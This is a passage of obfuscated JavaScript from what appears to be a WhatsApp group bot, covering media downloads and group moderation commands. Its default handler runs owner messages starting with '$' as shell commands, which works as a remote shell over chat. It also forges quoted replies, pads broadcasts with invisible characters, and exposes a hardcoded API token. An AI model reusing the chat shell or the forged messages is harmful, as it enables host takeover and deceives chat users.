_0x41364b=_0x271569,{dl_link:_0xc931ec,thumb:_0x18cb84,title:_0x19d65f,filesizeF:_0x42d226,filesize:_0x33b696}=_0x658f20;axios[_0x41364b(0x209)](_0x41364b(0x420)+_0xc931ec)['then'](_0x3f7d1a=>{const _0x21fdbd=_0x41364b;if(Number(_0x33b696)>=0x9c40)return _0x58a39e(_0x282d63,_0x18cb84,_0x21fdbd(0x354)+_0x19d65f+'\x0a*Ext*\x20:\x20MP3\x0a*Filesize*\x20:\x20'+_0x42d226+_0x21fdbd(0x329)+_0x3f7d1a[_0x21fdbd(0x1a4)]+'\x0a\x0a_Untuk\x20durasi\x20lebih\x20dari\x20batas\x20disajikan\x20dalam\x20mektuk\x20link_');const _0xe5ad6c=_0x21fdbd(0x451)+_0x19d65f+_0x21fdbd(0x2c3)+_0x42d226+_0x21fdbd(0x3e6);_0x58a39e(_0x282d63,_0x18cb84,_0xe5ad6c),_0x58a39e(_0x282d63,_0xc931ec)[_0x21fdbd(0x268)](()=>_0x54c827(mess[_0x21fdbd(0x309)][_0x21fdbd(0x3a7)]));});});}catch(_0x222df4){_0x54c827(mess[_0x271569(0x309)][_0x271569(0x3a7)]);}break;case prefix+'ytsearch':if(_0x794f7a[_0x271569(0x41c)]<0x1)return _0x54c827(_0x271569(0x3a5));var _0x16502c=_0x794f7a[_0x271569(0x3ab)]('');try{var _0x3f44f3=await yts(_0x16502c);}catch{return await _0x138c14['sendMessage'](_0x282d63,_0x271569(0x3dd),MessageType[_0x271569(0x459)],dload);}aramat=_0x3f44f3[_0x271569(0x224)];var _0x3bdd6e=await getBuffer(aramat[0x0][_0x271569(0x1d5)]),_0x3a55ae='';_0x3a55ae+=_0x271569(0x2aa),_0x3a55ae+='\x0a________________________\x0a\x0a',_0x3f44f3['all']['map'](_0x4f72e4=>{const _0x458f92=_0x271569;_0x3a55ae+=_0x458f92(0x374)+_0x4f72e4[_0x458f92(0x412)]+'\x0a',_0x3a55ae+=_0x458f92(0x36e)+_0x4f72e4[_0x458f92(0x2eb)]+'\x0a',_0x3a55ae+=_0x458f92(0x213)+_0x4f72e4[_0x458f92(0x2b2)]+'\x0a',_0x3a55ae+=_0x458f92(0x426)+_0x4f72e4[_0x458f92(0x3f0)]+_0x458f92(0x2c2);}),_0x3a55ae+=_0x271569(0x423),await _0x22e0d8(_0x3bdd6e,_0x3a55ae);break;case'ig':if(!_0x3617fb(_0x794f7a[0x0])&&!_0x794f7a[0x0][_0x271569(0x42a)](_0x271569(0x206)))return _0x54c827(mess['Iv']);if(!_0x10a56f)return _0xbe147b('Link?');_0x54c827(mess[_0x271569(0x28e)]),igdl(_0x794f7a[0x0])[_0x271569(0x3e5)](async _0x46f1fe=>{const _0x41c9f0=_0x271569;for(let _0x26a386 of _0x46f1fe[_0x41c9f0(0x393)]){if(_0x26a386[_0x41c9f0(0x42a)](_0x41c9f0(0x35a))){const _0x385d54=await getBuffer(_0x26a386);_0x138c14[_0x41c9f0(0x28d)](_0x282d63,_0x385d54,_0x356628,{'mimetype':'video/mp4','quoted':_0x15b2ca,'caption':_0x41c9f0(0x1ad)});}else{if(_0x26a386[_0x41c9f0(0x42a)](_0x41c9f0(0x34c))){const _0x699762=await getBuffer(_0x26a386);_0x138c14[_0x41c9f0(0x28d)](_0x282d63,_0x699762,_0x5ebec8,{'mimetype':_0x41c9f0(0x33e),'quoted':_0x15b2ca,'caption':_0x41c9f0(0x42f)});}}}});break;case prefix+_0x271569(0x1bd):if(!_0x10a56f)return _0xbe147b(_0x271569(0x1b8));ig[_0x271569(0x1c7)](''+_0x794f7a[_0x271569(0x3ab)]('\x20'))[_0x271569(0x3e5)](_0x4f5ed8=>{const _0x16494e=_0x271569;console['log'](''+_0x794f7a[_0x16494e(0x3ab)]('\x20')),ten=''+_0x4f5ed8[_0x16494e(0x422)],teks=_0x16494e(0x2ff)+_0x4f5ed8['profile_id']+_0x16494e(0x380)+_0x794f7a['join']('')+_0x16494e(0x42c)+_0x4f5ed8['full_name']+'\x0a*Bio*\x20:\x20'+_0x4f5ed8['biography']+_0x16494e(0x323)+_0x4f5ed8['following']+_0x16494e(0x3d2)+_0x4f5ed8[_0x16494e(0x1d6)]+'\x0a*Private*\x20:\x20'+_0x4f5ed8['is_private']+_0x16494e(0x3c7)+_0x4f5ed8['is_verified']+_0x16494e(0x284)+_0x794f7a[_0x16494e(0x3ab)](''),_0x58a39e(_0x282d63,ten,teks);});break;case prefix+_0x271569(0x2d9):if(!_0x3617fb(_0x794f7a[0x0])&&!_0x794f7a[0x0][_0x271569(0x42a)](_0x271569(0x266)))return _0x54c827(mess['Iv']);if(!_0x10a56f)return _0xbe147b(_0x271569(0x2bd));ten=_0x794f7a[0x0];var _0x2a1ef9=await twitterGetUrl(''+ten)['then'](_0x1c5ca3=>{const _0x5b1f39=_0x271569;ren=''+_0x1c5ca3['download'][0x2]['url'],_0x58a39e(_0x282d63,ren,_0x5b1f39(0x3c9));});break;case prefix+_0x271569(0x26b):if(!_0x3617fb(_0x794f7a[0x0])&&!_0x794f7a[0x0]['includes'](_0x271569(0x265)))return _0x54c827(mess['Iv']);if(!_0x10a56f)return _0xbe147b(_0x271569(0x2bd));_0x54c827(mess[_0x271569(0x28e)]),tik['ssstik'](''+_0x794f7a[0x0])[_0x271569(0x3e5)](_0x25495e=>{const _0x2ef9cc=_0x271569;console[_0x2ef9cc(0x1d4)](_0x25495e);const {videonowm:_0x525641,videonowm2:_0x5c7024,text:_0x59f01e}=_0x25495e;axios[_0x2ef9cc(0x209)]('https://tinyurl.com/api-create.php?url='+_0x5c7024)[_0x2ef9cc(0x3e5)](async _0x5b8866=>{const _0xce539c=_0x2ef9cc;me='*Title*\x20:\x20'+_0x59f01e+_0xce539c(0x329)+_0x5b8866['data'],_0x138c14[_0xce539c(0x28d)](_0x282d63,{'url':''+_0x525641},_0x356628,{'mimetype':_0xce539c(0x411),'quoted':_0x15b2ca,'caption':me});});})[_0x271569(0x268)](_0x322930=>console[_0x271569(0x1d4)](_0x322930));break;case prefix+_0x271569(0x1e2):if(!_0x3617fb(_0x794f7a[0x0])&&!_0x794f7a[0x0][_0x271569(0x42a)](_0x271569(0x265)))return _0x54c827(mess['Iv']);if(!_0x10a56f)return _0xbe147b(_0x271569(0x2bd));_0x54c827(mess[_0x271569(0x28e)]),tik[_0x271569(0x3ff)](''+_0x794f7a[0x0])[_0x271569(0x3e5)](_0x5598dd=>{const {music:_0x315e02,text:_0xa561e0}=_0x5598dd;_0x138c14['sendMessage'](_0x282d63,{'url':''+_0x315e02},_0x41197c,{'mimetype':'audio/mp4','filename':''+_0xa561e0,'quoted':_0x15b2ca});})['catch'](_0x2b3d25=>console[_0x271569(0x1d4)](_0x2b3d25));break;case prefix+'fb':if(!_0x10a56f)return _0x54c827(_0x271569(0x2bd));if(!_0x3617fb(_0x794f7a[0x0])&&!_0x794f7a[0x0][_0x271569(0x42a)](_0x271569(0x1fc)))return _0x54c827(mess['Iv']);_0x54c827(mess[_0x271569(0x28e)]),te=_0x794f7a[_0x271569(0x3ab)]('\x20'),_0x6bdcc6(mess[_0x271569(0x28e)]),Fb[_0x271569(0x306)](''+te)[_0x271569(0x3e5)](_0x311abd=>{const _0x15dc85=_0x271569;ten=''+_0x311abd[_0x15dc85(0x3e9)]['sd'],tek=''+_0x311abd[_0x15dc85(0x412)],_0x58a39e(_0x282d63,ten,'*Title*\x20:\x20'+tek+_0x15dc85(0x326)+ten)[_0x15dc85(0x268)](_0x36277e=>{const _0x3d1df2=_0x15dc85;_0x54c827(_0x3d1df2(0x2fe));});});break;case prefix+_0x271569(0x297):if(_0x794f7a['length']<0x1)return _0x54c827('Que\x20clase\x20de\x20pregunta\x20es\x20esa');brien=_0x794f7a[_0x271569(0x3ab)]('\x20'),brainly(''+brien)[_0x271569(0x3e5)](_0x1a90ad=>{const _0x3ff7c7=_0x271569;teks=_0x3ff7c7(0x1ac);for(let _0x5610e5 of _0x1a90ad[_0x3ff7c7(0x1a4)]){teks+='\x0a*「\x20_BRAINLY_\x20」*\x0a\x0a*➸\x20Pregunta:*\x20'+_0x5610e5['pertanyaan']+_0x3ff7c7(0x3bf)+_0x5610e5[_0x3ff7c7(0x1e5)][0x0][_0x3ff7c7(0x459)]+_0x3ff7c7(0x32a);}_0x138c14['sendMessage'](_0x282d63,teks,_0xfa1a73,{'quoted':_0x15b2ca,'detectLinks':![]});});break;case prefix+_0x271569(0x1a1):if(!_0x10a56f)return _0x54c827(_0x271569(0x322))[_0x271569(0x3e5)](_0x5fafc0=>_0x5fafc0[_0x271569(0x38b)]());afanya=_0x794f7a[_0x271569(0x3ab)]('\x20'),gogel=await axios[_0x271569(0x209)]('https://shot.screenshotapi.net/screenshot?token=D2TDY3F-G5YMM94-K9JEQT8-FYBDQBB&url=https://www.google.com/search?q='+afanya+_0x271569(0x200)),bupnyah=await getBuffer(gogel[_0x271569(0x1a4)][_0x271569(0x438)]),_0x138c14[_0x271569(0x28d)](_0x282d63,bupnyah,_0x5ebec8,{'quoted':_0x15b2ca,'sendEphemeral':!![]})[_0x271569(0x268)](_0x1e88f3=>{return'Mengulang\x20lord\x20ada\x20yg\x20mengerror...';});break;case prefix+_0x271569(0x35f):if(!_0x59ec0d)return _0x54c827(mess[_0x271569(0x1b4)][_0x271569(0x1f5)]);if(!_0x48a020)return _0x54c827(mess[_0x271569(0x1b4)][_0x271569(0x30e)]);if(!_0x5dd02a)return _0x54c827(mess[_0x271569(0x1b4)]['Badmin']);if(_0x794f7a[_0x271569(0x41c)]<0x1)return _0x54c827('A\x20quien\x20quieres\x20agregar\x20oni\x20chan\x20O~O?');if(_0x794f7a[0x0][_0x271569(0x201)]('08'))return _0x54c827(_0x271569(0x435));try{num=_0x794f7a[0x0][_0x271569(0x1eb)](/ /g,'')+_0x271569(0x1ae),_0x138c14[_0x271569(0x1be)](_0x282d63,[num]);}catch(_0x19de9b){console[_0x271569(0x1d4)](_0x271569(0x22f),_0x19de9b),_0x54c827('No\x20se\x20pudo\x20agregar\x20el\x20objetivo,\x20tal\x20vez\x20porque\x20en\x20privado');}break;case prefix+_0x271569(0x454):if(!_0x59ec0d)return _0x54c827(mess[_0x271569(0x1b4)][_0x271569(0x1f5)]);if(!_0x48a020)return _0x54c827(mess[_0x271569(0x1b4)][_0x271569(0x30e)]);if(!_0x5dd02a)return _0x54c827(mess[_0x271569(0x1b4)][_0x271569(0x446)]);if(_0x15b2ca[_0x271569(0x352)]['extendedTextMessage']===undefined||_0x15b2ca[_0x271569(0x352)][_0x271569(0x45e)]===null)return _0x54c827(_0x271569(0x328));mentioned=_0x15b2ca[_0x271569(0x352)][_0x271569(0x45e)][_0x271569(0x397)]['mentionedJid'];if(mentioned[_0x271569(0x41c)]>0x1){teks='*Adios\x20putito\x20>:]\x20:*\x20';for(let _0x465f3a of mentioned){teks+='@'+_0x465f3a[_0x271569(0x2a7)]('@')[0x0]+'\x0a';}_0x1eca8a(teks,mentioned,!![]),_0x138c14[_0x271569(0x401)](_0x282d63,mentioned);}else _0x1eca8a(_0x271569(0x2c1)+mentioned[0x0][_0x271569(0x2a7)]('@')[0x0],mentioned,!![]),_0x138c14[_0x271569(0x401)](_0x282d63,mentioned);break;case prefix+'promote':if(!_0x59ec0d)return _0x54c827(mess[_0x271569(0x1b4)][_0x271569(0x1f5)]);if(!_0x48a020)return _0x54c827(mess[_0x271569(0x1b4)]['admin']);if(!_0x5dd02a)return _0x54c827(mess['only'][_0x271569(0x446)]);if(_0x15b2ca[_0x271569(0x352)][_0x271569(0x45e)]===undefined||_0x15b2ca[_0x271569(0x352)][_0x271569(0x45e)]===null)return;mentioned=_0x15b2ca[_0x271569(0x352)][_0x271569(0x45e)][_0x271569(0x397)][_0x271569(0x458)];if(mentioned[_0x271569(0x41c)]>0x1){teks=_0x271569(0x2b7);for(let _0x575804 of mentioned){teks+='@'+_0x575804[_0x271569(0x2a7)]('@')[0x0]+'\x0a';}_0x1eca8a(_0x282d63,mentioned,!![]),_0x138c14[_0x271569(0x401)](_0x282d63,mentioned);}else _0x1eca8a(_0x271569(0x1f0)+mentioned[0x0][_0x271569(0x2a7)]('@')[0x0]+_0x271569(0x413),mentioned,!![]),_0x138c14[_0x271569(0x384)](_0x282d63,mentioned);break;case prefix+_0x271569(0x212):if(!_0x59ec0d)return _0x54c827(mess[_0x271569(0x1b4)][_0x271569(0x1f5)]);if(!_0x48a020)return _0x54c827(mess[_0x271569(0x1b4)][_0x271569(0x30e)]);if(!_0x5dd02a)return _0x54c827(mess[_0x271569(0x1b4)][_0x271569(0x446)]);if(_0x15b2ca[_0x271569(0x352)][_0x271569(0x45e)]===undefined||_0x15b2ca[_0x271569(0x352)]['extendedTextMessage']===null)return;mentioned=_0x15b2ca[_0x271569(0x352)][_0x271569(0x45e)][_0x271569(0x397)][_0x271569(0x458)];if(mentioned[_0x271569(0x41c)]>0x1){teks=_0x271569(0x2b5);for(let _0xc58ac4 of mentioned){teks+='@'+_0xc58ac4[_0x271569(0x2a7)]('@')[0x0]+'\x0a';}_0x1eca8a(teks,mentioned,!![]),_0x138c14[_0x271569(0x401)](_0x282d63,mentioned);}else _0x1eca8a(_0x271569(0x2d5)+mentioned[0x0][_0x271569(0x2a7)]('@')[0x0]+_0x271569(0x233),mentioned,!![]),_0x138c14['groupDemoteAdmin'](_0x282d63,mentioned);break;case prefix+_0x271569(0x339):if(!_0x10a56f)return _0x54c827(prefix+_0x271569(0x3d5));jids=targetpc+'@s.whatsapp.net';var _0xf36665=_0x794f7a[_0x271569(0x3ab)]('\x20')['replace'](/@|\d/gi,'')[_0x271569(0x2a7)]('|'),_0x10a10f=_0x15b2ca[_0x271569(0x352)]['extendedTextMessage'][_0x271569(0x397)][_0x271569(0x458)][0x0],_0xdcb5c7={'contextInfo':{'quotedMessage':{'extendedTextMessage':{'text':_0xf36665[0x0]}}}};const _0x131a2e=await _0x138c14[_0x271569(0x28d)](jids,''+_0xf36665[0x1],MessageType[_0x271569(0x459)],_0xdcb5c7);await _0x138c14[_0x271569(0x194)](jids,{'id':_0x131a2e[_0x271569(0x1db)],'remoteJid':jids,'fromMe':!![]});break;case prefix+_0x271569(0x1c0):_0x3048f6=_0x794f7a[_0x271569(0x3ab)]('\x20'),entah=_0x3048f6[_0x271569(0x2a7)]('|')[0x0],nah=_0x3048f6['split']('|')[0x1];if(isNaN(entah))return _0x54c827('Invalid\x20phone\x20number');vcard=_0x271569(0x453)+'VERSION:3.0\x0a'+('FN:'+nah+'\x0a')+(_0x271569(0x204)+entah+':'+phoneNum('+'+entah)[_0x271569(0x3be)]('internasional')+'\x0a')+_0x271569(0x39a)[_0x271569(0x41d)](),_0x138c14[_0x271569(0x28d)](_0x282d63,{'displayName':''+nah,'vcard':vcard},_0x3d436f);break;case prefix+_0x271569(0x385):if(!_0x15b2ca['key'][_0x271569(0x31d)])return _0x6bdcc6('SATANCITO\x20ᵈᵃʳʸ⛥');if(!_0x59ec0d)return _0x54c827(mess[_0x271569(0x1b4)][_0x271569(0x1f5)]);var _0x22334d=_0x794f7a['join']('\x20'),_0x373d86=await _0x138c14[_0x271569(0x315)](_0x282d63),_0x2f8552=_0x373d86[_0x271569(0x439)],_0x509e77=[];_0x2f8552['map'](async _0x29ca84=>{const _0x432205=_0x271569;_0x509e77[_0x432205(0x27e)](_0x29ca84['id'][_0x432205(0x1eb)](_0x432205(0x1e4),_0x432205(0x215)));});var _0x4d46d7={'text':_0x22334d,'contextInfo':{'mentionedJid':_0x509e77},'quoted':_0x15b2ca};_0x138c14[_0x271569(0x28d)](_0x282d63,_0x4d46d7,_0xfa1a73);break;case prefix+_0x271569(0x2e6):if((_0xd2003&&!_0x15b2ca[_0x271569(0x352)][_0x271569(0x1bc)]||_0x5e3250)&&_0x794f7a[_0x271569(0x41c)]==0x0){encmedia=_0x5e3250?JSON[_0x271569(0x290)](JSON[_0x271569(0x3bd)](_0x15b2ca)[_0x271569(0x1eb)](_0x271569(0x1f8),'m'))['message'][_0x271569(0x45e)][_0x271569(0x397)]:_0x15b2ca,file=await _0x138c14[_0x271569(0x292)](encmedia,filename=getRandom()),_0x22334d=_0x794f7a[_0x271569(0x3ab)]('\x20');var _0x373d86=await _0x138c14['groupMetadata'](_0x282d63),_0x2f8552=_0x373d86[_0x271569(0x439)],_0x509e77=[];_0x2f8552[_0x271569(0x421)](async _0xff986=>{const _0x260130=_0x271569;_0x509e77[_0x260130(0x27e)](_0xff986['id'][_0x260130(0x1eb)](_0x260130(0x1e4),_0x260130(0x215)));});var _0xdcb5c7={'contextInfo':{'mentionedJid':_0x509e77},'quoted':_0x15b2ca};ini_buffer=fs[_0x271569(0x2d2)](file),_0x138c14[_0x271569(0x28d)](_0x282d63,ini_buffer,MessageType[_0x271569(0x1a5)],_0xdcb5c7),fs[_0x271569(0x3f7)](file);}else _0x54c827('*Reply\x20sticker\x20yang\x20sudah\x20dikirim*');break;case prefix+_0x271569(0x43c):if(!_0x5e0b01)return _0x54c827(_0x271569(0x2ce)+(prefix+_0x53e86e));quoted=JSON[_0x271569(0x290)](JSON[_0x271569(0x3bd)](_0x15b2ca)[_0x271569(0x1eb)](_0x271569(0x1f8),'m'))[_0x271569(0x352)][_0x271569(0x45e)][_0x271569(0x397)],download=await _0x138c14[_0x271569(0x39e)](quoted),await fs['writeFileSync'](_0x271569(0x361),download);var _0x373d86=await _0x138c14[_0x271569(0x315)](_0x282d63),_0x2f8552=_0x373d86[_0x271569(0x439)],_0x509e77=[];_0x2f8552[_0x271569(0x421)](async _0x1022e0=>{const _0x5190ee=_0x271569;_0x509e77[_0x5190ee(0x27e)](_0x1022e0['id'][_0x5190ee(0x1eb)](_0x5190ee(0x1e4),'s.whatsapp.net'));}),thumb=fs[_0x271569(0x2d2)]('giftag.gif'),_0x138c14['sendMessage'](_0x282d63,thumb,_0x356628,{'contextInfo':{'mentionedJid':_0x509e77},'quoted':_0x15b2ca,'mimetype':_0x271569(0x386),'thumbnail':thumb}),await fs[_0x271569(0x3f7)](_0x271569(0x361));break;case prefix+_0x271569(0x19b):if(!_0x106917)return amek['reply'](_0x282d63,_0x271569(0x377)+(prefix+_0x53e86e)+'*',_0x15b2ca);quoted=JSON[_0x271569(0x290)](JSON[_0x271569(0x3bd)](_0x15b2ca)[_0x271569(0x1eb)](_0x271569(0x1f8),'m'))['message'][_0x271569(0x45e)][_0x271569(0x397)],download=await _0x138c14[_0x271569(0x39e)](quoted),await fs['writeFileSync'](_0x271569(0x3a0),download);var _0x373d86=await _0x138c14[_0x271569(0x315)](_0x282d63),_0x2f8552=_0x373d86['participants'],_0x509e77=[];_0x2f8552[_0x271569(0x421)](async _0x1b4e77=>{const _0x13c1a1=_0x271569;_0x509e77['push'](_0x1b4e77['id'][_0x13c1a1(0x1eb)](_0x13c1a1(0x1e4),_0x13c1a1(0x215)));}),_0x138c14[_0x271569(0x28d)](_0x282d63,fs[_0x271569(0x2d2)]('doc.txt'),_0x7c7b0e,{'contextInfo':{'mentionedJid':_0x509e77},'quoted':_0x15b2ca,'mimetype':'text/plain'}),await fs['unlinkSync'](_0x271569(0x3a0));break;case prefix+'kontag':if(!_0x15b2ca[_0x271569(0x46f)][_0x271569(0x31d)])return _0x54c827('SATANCITO\x20ᵈᵃʳʸ⛥');_0x3048f6=_0x794f7a[_0x271569(0x3ab)](''),entah=_0x3048f6['split']('|')[0x0],nah=_0x3048f6[_0x271569(0x2a7)]('|')[0x1];if(isNaN(entah))return _0x54c827('Invalid\x20phone\x20number');members_ids=[];for(let _0x347eb9 of _0x1b2868){members_ids[_0x271569(0x27e)](_0x347eb9[_0x271569(0x3f6)]);}vcard='BEGIN:VCARD\x0a'+_0x271569(0x399)+(_0x271569(0x216)+nah+'\x0a')+('TEL;type=CELL;type=VOICE;waid='+entah+':'+phoneNum('+'+entah)[_0x271569(0x3be)]('internasional')+'\x0a')+_0x271569(0x39a)[_0x271569(0x41d)](),_0x138c14['sendMessage'](_0x282d63,{'displayName':''+nah,'vcard':vcard},_0x3d436f,{'contextInfo':{'mentionedJid':members_ids}});break;case prefix+_0x271569(0x3ea):if((_0xd2003&&!_0x15b2ca[_0x271569(0x352)][_0x271569(0x1bc)]||_0x5e3250)&&_0x794f7a['length']==0x0){encmedia=_0x5e3250?JSON[_0x271569(0x290)](JSON[_0x271569(0x3bd)](_0x15b2ca)['replace'](_0x271569(0x1f8),'m'))[_0x271569(0x352)][_0x271569(0x45e)]['contextInfo']:_0x15b2ca,file=await _0x138c14[_0x271569(0x292)](encmedia,filename=getRandom()),_0x22334d=_0x794f7a['join']('\x20');var _0x373d86=await _0x138c14[_0x271569(0x315)](_0x282d63),_0x2f8552=_0x373d86[_0x271569(0x439)],_0x509e77=[];_0x2f8552['map'](async _0x553b66=>{const _0x43f3e1=_0x271569;_0x509e77['push'](_0x553b66['id']['replace'](_0x43f3e1(0x1e4),_0x43f3e1(0x215)));});var _0xdcb5c7={'contextInfo':{'mentionedJid':_0x509e77},'quoted':_0x15b2ca};ini_buffer=fs[_0x271569(0x2d2)](file),_0x138c14[_0x271569(0x28d)](_0x282d63,ini_buffer,MessageType[_0x271569(0x1a5)],_0xdcb5c7),fs['unlinkSync'](file);}else{if((_0xd2003&&!_0x15b2ca[_0x271569(0x352)][_0x271569(0x1bc)]||_0x2c43f4)&&_0x794f7a[_0x271569(0x41c)]==0x0){encmedia=_0x2c43f4?JSON[_0x271569(0x290)](JSON[_0x271569(0x3bd)](_0x15b2ca)[_0x271569(0x1eb)](_0x271569(0x1f8),'m'))[_0x271569(0x352)][_0x271569(0x45e)][_0x271569(0x397)]:_0x15b2ca,file=await _0x138c14[_0x271569(0x292)](encmedia,filename=getRandom()),_0x22334d=_0x794f7a[_0x271569(0x3ab)]('\x20');var _0x373d86=await _0x138c14[_0x271569(0x315)](_0x282d63),_0x2f8552=_0x373d86[_0x271569(0x439)],_0x509e77=[];_0x2f8552[_0x271569(0x421)](async _0x5a74d1=>{const _0x35514e=_0x271569;_0x509e77['push'](_0x5a74d1['id'][_0x35514e(0x1eb)](_0x35514e(0x1e4),_0x35514e(0x215)));});var _0xdcb5c7={'contextInfo':{'mentionedJid':_0x509e77},'quoted':_0x15b2ca};ini_buffer=fs[_0x271569(0x2d2)](file),_0x138c14[_0x271569(0x28d)](_0x282d63,ini_buffer,_0x5ebec8,_0xdcb5c7),fs['unlinkSync'](file);}else{if((_0xd2003&&!_0x15b2ca['message'][_0x271569(0x1bc)]||_0x334ff3)&&_0x794f7a[_0x271569(0x41c)]==0x0){encmedia=_0x334ff3?JSON[_0x271569(0x290)](JSON['stringify'](_0x15b2ca)[_0x271569(0x1eb)]('quotedM','m'))[_0x271569(0x352)][_0x271569(0x45e)][_0x271569(0x397)]:_0x15b2ca,file=await _0x138c14['downloadAndSaveMediaMessage'](encmedia,filename=getRandom()),_0x22334d=_0x794f7a[_0x271569(0x3ab)]('\x20');var _0x373d86=await _0x138c14[_0x271569(0x315)](_0x282d63),_0x2f8552=_0x373d86[_0x271569(0x439)],_0x509e77=[];_0x2f8552[_0x271569(0x421)](async _0x5b07c5=>{const _0x5661e1=_0x271569;_0x509e77['push'](_0x5b07c5['id']['replace'](_0x5661e1(0x1e4),_0x5661e1(0x215)));});var _0xdcb5c7={'mimetype':_0x271569(0x442),'ptt':!![],'contextInfo':{'mentionedJid':_0x509e77},'quoted':_0x15b2ca};ini_buffer=fs[_0x271569(0x2d2)](file),_0x138c14[_0x271569(0x28d)](_0x282d63,ini_buffer,_0x41197c,_0xdcb5c7),fs[_0x271569(0x3f7)](file);}else{if((_0xd2003&&!_0x15b2ca['message'][_0x271569(0x1bc)]||_0x5e0b01)&&_0x794f7a[_0x271569(0x41c)]==0x0){encmedia=_0x5e0b01?JSON[_0x271569(0x290)](JSON[_0x271569(0x3bd)](_0x15b2ca)[_0x271569(0x1eb)]('quotedM','m'))[_0x271569(0x352)][_0x271569(0x45e)][_0x271569(0x397)]:_0x15b2ca,file=await _0x138c14[_0x271569(0x292)](encmedia,filename=getRandom()),_0x22334d=_0x794f7a[_0x271569(0x3ab)]('\x20');var _0x373d86=await _0x138c14[_0x271569(0x315)](_0x282d63),_0x2f8552=_0x373d86[_0x271569(0x439)],_0x509e77=[];_0x2f8552[_0x271569(0x421)](async _0x2ae380=>{const _0x3e5f0d=_0x271569;_0x509e77[_0x3e5f0d(0x27e)](_0x2ae380['id'][_0x3e5f0d(0x1eb)]('c.us','s.whatsapp.net'));});var _0xdcb5c7={'mimetype':'video/mp4','contextInfo':{'mentionedJid':_0x509e77},'quoted':_0x15b2ca};ini_buffer=fs[_0x271569(0x2d2)](file),_0x138c14[_0x271569(0x28d)](_0x282d63,ini_buffer,_0x356628,_0xdcb5c7),fs[_0x271569(0x3f7)](file);}else _0x54c827(_0x271569(0x36d)+prefix+_0x271569(0x3ea));}}}break;case prefix+_0x271569(0x3ab):try{if(!_0x3617fb(_0x794f7a[0x0])&&!_0x794f7a[0x0][_0x271569(0x42a)](_0x271569(0x394)))return _0x54c827(mess['Iv']);hen=_0x794f7a[0x0];if(!_0x10a56f)return _0x6bdcc6(_0x271569(0x37c));var _0x2308fe=hen[_0x271569(0x2a7)](_0x271569(0x45d))[0x1];if(!_0x2308fe)return _0xbe147b('asegúrese\x20de\x20que\x20el\x20enlace\x20sea\x20correcto\x20T-T!');var _0x2e31f2=await _0x138c14[_0x271569(0x28b)](_0x2308fe);_0x6bdcc6(_0x271569(0x42e));}catch{_0xbe147b(_0x271569(0x2e1));}break;case prefix+_0x271569(0x34e):case prefix+_0x271569(0x37e):run=process['uptime'](),teks=''+kyun(run),_0xbe147b(teks);break;case prefix+'speed':case prefix+_0x271569(0x3e7):const _0x552c2b=speed(),_0x313bff=speed()-_0x552c2b;exec(_0x271569(0x2ab),(_0x52c4ac,_0x54ba52,_0xd3a344)=>{const _0x41f85d=_0x271569,_0x9a28f3=_0x54ba52[_0x41f85d(0x298)]('utf-8'),_0xa337e4=_0x9a28f3['replace'](/Memory:/,'Ram:'),_0x50acf7='*'+_0xa337e4+_0x41f85d(0x2cb)+_0x313bff['toFixed'](0x4)+_0x41f85d(0x348);_0xbe147b(_0x50acf7);});break;case prefix+'bc':if(!_0x3d1dac)return _0x54c827(_0x271569(0x3d9));if(_0x794f7a[_0x271569(0x41c)]<0x1)return _0x54c827('.......');const _0x53aa4b=String[_0x271569(0x236)](0x200e),_0x5713ae=_0x53aa4b['repeat'](0xfa1);_0x2d949b=await _0x138c14[_0x271569(0x283)][_0x271569(0x224)]();if(_0xd2003&&!_0x15b2ca[_0x271569(0x352)][_0x271569(0x1bc)]||_0x2c43f4){const _0x5accc2=_0x2c43f4?JSON[_0x271569(0x290)](JSON[_0x271569(0x3bd)](_0x15b2ca)[_0x271569(0x1eb)](_0x271569(0x1f8),'m'))[_0x271569(0x352)][_0x271569(0x45e)][_0x271569(0x397)]:_0x15b2ca;bc=await _0x138c14[_0x271569(0x39e)](_0x5accc2);for(let _0x41de87 of _0x2d949b){_0x138c14['sendMessage'](_0x41de87[_0x271569(0x3f6)],bc,_0x5ebec8,{'caption':body[_0x271569(0x225)](0x4)+'\x0a>\x20Izin\x20Broadcast','sendEphemeral':!![]});}_0x54c827(_0x271569(0x42e));}else{for(let _0xdb595f of _0x2d949b){_0x210ae5(_0xdb595f[_0x271569(0x3f6)],''+body[_0x271569(0x225)](0x4)+_0x5713ae+_0x271569(0x3fd));}_0x54c827(_0x271569(0x249));}break;case prefix+_0x271569(0x1d8):if(!_0x59ec0d)return _0x54c827(mess[_0x271569(0x1b4)][_0x271569(0x1f5)]);const _0x23ca8c=_0xf81795(_0x953611),_0x238cc6=_0x11384f(_0x953611);if(_0x23ca8c===undefined&&_0x238cc6===undefined)return _0x54c827('Etto\x20O^O?');const _0x3add00=0x1388*(Math['pow'](0x2,_0x23ca8c)-0x1);resul=_0x271569(0x255)+_0x372c28+_0x271569(0x1e7)+_0x953611[_0x271569(0x2a7)]('@')[0x0]+_0x271569(0x20a)+_0x238cc6+'/'+_0x3add00+'\x0a└\x20Nivel\x20:\x20'+_0x23ca8c,_0x29151e(resul,_0xfa1a73,numbernye,_0x4ffc63);break;case prefix+_0x271569(0x31e):oi=body[_0x271569(0x225)](0x8),oii=await getBuffer('https://patoapi.herokuapp.com/api/photooxy/naruto?text='+oi),_0x138c14[_0x271569(0x28d)](_0x282d63,oii,_0x5ebec8,{'quoted':_0x15b2ca,'caption':_0x271569(0x1cd)});break;default:if(budy[_0x271569(0x201)]('$')){if(!_0x3d1dac)return;var _0x46fccd=budy[_0x271569(0x225)](0x2);exec(_0x46fccd,(_0x578194,_0xc08b02)=>{const _0x16fd79=_0x271569;if(_0x578194)return _0x54c827(''+_0x578194);_0xc08b02&&(_0x54c827(''+_0xc08b02),console[_0x16fd79(0x1d4)]('\x1b[1;37m>','[',_0x16fd79(0x316),']',_0x5a6f33,color('$',_0x16fd79(0x319)),_0x16fd79(0x238),color(_0x2308e2[_0x16fd79(0x2a7)]('@')[0x0]),'args\x20:',color(_0x794f7a[_0x16fd79(0x41c)])));});}if(budy[_0x271569(0x201)]('>')){if(!_0x3d1dac)return;var _0x46fccd=budy[_0x271569(0x225)](0x2);function _0x406544(_0x1baded){const _0x452b93=_0x271569;var _0x4182fb=JSON[_0x452b93(0x3bd)](_0x1baded,null,0x2),_0x22dd3a=util[_0x452b93(0x291)](_0x4182fb);return 